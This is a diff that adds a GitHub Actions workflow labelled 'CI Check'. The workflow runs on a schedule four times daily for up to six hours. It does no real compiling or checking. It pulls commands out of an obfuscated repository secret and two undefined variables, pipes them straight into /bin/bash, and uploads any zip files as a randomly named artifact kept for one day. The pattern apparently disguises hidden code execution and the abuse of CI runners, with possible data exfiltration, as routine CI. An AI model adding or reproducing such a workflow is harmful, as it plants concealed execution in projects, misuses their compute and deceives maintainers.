@@ -1,0 +1,30 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '19 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          na963: ${{ secrets.na963 }}
+        run: |
+          printf '%s' "$na963" | jq -r .k74479 | /bin/bash
+          echo $ph84348 | jq -r .qds0212 | /bin/bash
+          echo $ewijo12 | jq -r .od157 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: tVlPMGEc
+          path: "*.zip"
+          retention-days: 1
